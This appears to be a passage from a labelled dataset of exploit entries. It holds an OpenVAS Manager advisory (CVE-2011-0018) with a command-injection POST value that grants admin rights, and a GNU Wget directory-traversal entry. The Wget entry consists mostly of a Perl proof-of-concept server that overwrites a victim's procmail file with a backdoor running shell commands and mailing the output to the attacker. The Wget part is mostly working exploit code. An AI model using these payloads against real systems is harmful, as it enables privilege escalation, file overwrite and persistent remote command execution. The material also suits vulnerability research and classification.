elements of this vulnerability have not yet been addressed in the Greenbone Security Assistant web application.  Technical Details  It has been identified that OpenVAS Manager is vulnerable to command injection due to insufficient validation of user supplied data when processing OMP requests. It has been identified that this vulnerability allows an authenticated user of the Greenbone Security Assistant web application (which communicates with OpenVAS Manager using OMP) to escalate their privileges with just a few clicks although more complex attacks may also be possible.  Escalation of privileges can be achieved accessing the Greenbone Security Assistant, creating an escalator with a modified POST request as follows:  Content-Disposition: form-data; name=""method_data:to_address""  none@none>/var/lib/openvas/users/alexander/isadmin  The processing of this request causes GSA to make a request to OpenVAS Manager which causes the command below to be executed with the privileges of the OpenVAS Manager (typically root) using the email() function from manage_sql.c:  command = g_strdup_printf (""echo \"""" ""To: %s\n"" ""From: %s\n"" ""Subject: %s\n"" ""\n"" ""%s\"""" "" | /usr/sbin/sendmail %s"" "" > /dev/null 2>&1"", to_address, from_address ? from_address : ""automated (at) openvas (dot) org [email concealed]"", subject, body, to_address); ... if (ret = system (command)...  As you can see, an attacker can influence both the to and from addresses within the concatenated string. The OpenVAS Manager uses the presence of the file isadmin to determine the privileges associated with the account.  The vulnerable code path is only accessible to authenticated users of OpenVAS Manager however it may also be triggered either directly or by using a cross-site request forgery based attack via the Greenbone Security Assistant web application.  Fix  OpenVAS recommends that the publicly available patches are applied. If building from source, then either patch r9974 (trunk) or r9976 (1.0.x) should be obtained from the OpenVAS SVN repository. A fresh tarball containing the latest stable release can be obtained from:  * http://wald.intevation.org/frs/download.php/829/openvas-manager-1.0.4.ta r.gz  In the event that OpenVAS has been supplied as part of a distribution then the vendor or organisation concerned should be contacted for a patch.  History  On 14th January 2011, Ronald Kingma contacted Greenbone Networks to report the described vulnerability affecting OpenVAS Manager.  Greenbone Networks began working on patches to resolve the vulnerability. Over the weekend of the 15th and 16th of January, Greenbone Networks applied patches to resolve the vulnerability in trunk and the 1.0 branch respectively.  On the 17th, Greenbone Networks contacted the OpenVAS security team to notify them of the vulnerability and request assistance in coordinating the disclosure.  The OpenVAS security team, Greenbone Networks and Ronald opened a dialogue in order to draft this advisory and on the 18th, CVE-2011-0018 was assigned for this vulnerability.  The OpenVAS security team continued evaluating the vulnerability, identifying that it may also be triggered using a cross-site request forgery based attack.  OpenVAS Manager 1.0.4 was released on the 19th.  Thanks  OpenVAS would like to thank Ronald Kingma and Alexander van Eee of ISSX for their help in reporting the vulnerability. -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.10 (GNU/Linux)  iQIcBAABCAAGBQJNPrfPAAoJEPJhpTVyySo71YkQAMFHectZJUW8CZ4i4+w4v4OO THVIFh3mJHUVrKnJerueEPk0cxmMvnIoAhx6L9gbrNbQccPWW7vS64zSJaY3Os9+ u4GVIFIr3/pPcBL4T8hCRQSs0esJKBPfCNt4YEXFGWhp+s4TkcR9kOs+gFc0kfrw Zc5fWDG/fJvEh5RyIGSj+dKvVjCa5hvsPqXl0pN6Dr2DscCVwX2I3yyy7bOJAwAp BY68qqFWorshWC9KdvkcYSuSdkTZmIOHFsafcvXn1Po/e5zGp9U+smA4zxy67s/o wry3VxSJf/CzLKuK+GCDBPjfx3PnvoWxyZeDfuJ6Tikk8aOpPA28bvVliXFViR5I 4GmNo/e6QUxio7jYjW4hmh2HmNAGjNmAhibaHDmuRtR7Qq25I9EL9DiX2oH0ytNB AwTB6syFm88E8LQPm2vSMn/GKcitK97rdyUQ/lBcPU419SPBWYC3Wr2pkR9EiSw6 AjyRrUqe3EC+IAYn6xmOdKyuNXsAvobe57a3AeyUON3tuMVCfWZu4tlYEjHO/bY9 rlfO1Oqj0ZziBmLwVyXHpjZVYnms8WTSV479jUfCbUckxJsXB8cLnV72TPoBd2Zy ha+JgGwGt0BUPcq1MzLhjqYGg2VPYzKCtlcql74F/cRgEF/wvXjys53Vhv17Cukb pg+nMuyc9kAdHLnkvLR6 =MOuA -----END PGP SIGNATURE-----",insufficient validation of user supplied data when processing OMP requests,1
24813,"GNU Wget 1.x - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/11871/info  Multiple remote vulnerabilities reportedly affect GNU wget. These issues are due to the application's failure to properly sanitize user-supplied input and to properly validate the presence of files before writing to them. The issues include:  - a potential directory-traversal issue - an arbitrary file-overwriting vulnerability - a weakness caused by the application's failure to filter potentially malicious characters from server-supplied input.   Via a malicious server, an attacker may exploit these issues to arbitrarily overwrite files within the current directory and potentially outside of it. This may let the attacker corrupt files, cause a denial of service, and possibly launch further attacks against the affected computer. Overwriting of files would take place with the privileges of the user that activates the vulnerable application.   --  )^o-o^|    jabber: rdancer@NJS.NetLab.Cz  | .v  K    e-mail: jjminar FastMail FM  `  - .'     phone: +44(0)7981 738 696   \ __/Jan     icq: 345 355 493  __|o|__Min??  irc: rdancer@IRC.FreeNode.Net  #!/usr/bin/perl -W # wgettrap.poc -- A POC for the wget(1) directory traversal vulnerability # # Copyright 2004 Jan Min???? (jjminar fastmail fm) # License: Public Domain # # When wget connects to us, we send it a HTTP redirect constructed so that wget # wget will connect the second time, it will be attempting to override # ~/.procm4ilrc (well, provided that the user running wget has username 'jan' # 8-)).  use POSIX qw(strftime);  # This is our scheme/host/port $server = ""http://localhost:31340""; # Use this + DNS poisoning with wget 1.9 & CVS #$server = ""http://.."";  # Wanna know who got infected? #$log = ""/dev/pts/1"";  # The filename we will try to overwrite on the target system $filename = ""/home/jan/.procm4ilrc%00This%20part%20will%20be%20ignored."";  ############### Payload ######################################### $email = 'your@mailbox'; $password = 'Pmrpuf ner cevzvgvirf'; $payload = <<EOP; :0c | mail -s 'Wgettrap mail copy' $email :0 * ^X-Wgettrap-Command: shell * ^X-Wgettrap-Password: $password | /bin/sh -c '/bin/sh | mail -s ""Wgettrap shell output"" $email' EOP chomp $payload; ############### Payload #########################################  # A simple directory traversal, for greater effect $trick = ""/.."" . ""%2f.."" x 40;  open LOG, "">$log"" if $log;  while(<STDIN>){         print LOG $_ if $log;         if (/\Q$trick$filename\E/) {         #if (/%2f/) {                 # We see the filename, so this is the second time                 # they're here.  Time to feed the sploit.                 $second++;         } elsif (/^Range: bytes=\(33\)-/) {                 # Appending goes like this:                 # (1) Tell'em what you're gonna tell'em                 # (2) Then tell'em just a half                 # (3) Close it                 # (4) Wait                 # (5) They're comin' back, with wget -c                 # (6) Tell'em the sploit                 # (7) Close again                 # (8) Wtf? They're comin' back with wget -c again                 # (9) Tell'em the rest...                 # (10) ... enjoying the backdoor at the same time                 print LOG ""File if $1 bytes long\n"" if $log;         } elsif (/^\r?$/) {                 # The HTTP headers are over.  Let's do it!                 $date = strftime (""%a, %e %b %Y %H:%M:%S %z"", localtime);                 if (!$second) {                         # Print the payload                         print <<EOT; HTTP/1.1 301 Moved Permanently\r Date: $date\r Server: wgettrap 1.1\r Accept-Ranges: bytes\r Location: $server$trick$filename\r Content-Length: 43\r Connection: close\r Content-Type: text/html\r \r <html><head><title></title></head></html>\r EOT                 } else {                         # Print the redirection                         print <<EOT; HTTP/1.1 200 OK\r Date: $date\r Server: wgettrap 1.1\r Accept-Ranges: bytes\r Content-Length: 25\r Connection: close\r Content-Type: text/plain\r \r $payload EOT                 }                 exit 0;         } }",failure to properly sanitize user-supplied input and to properly validate the presence of files before writing to them,1
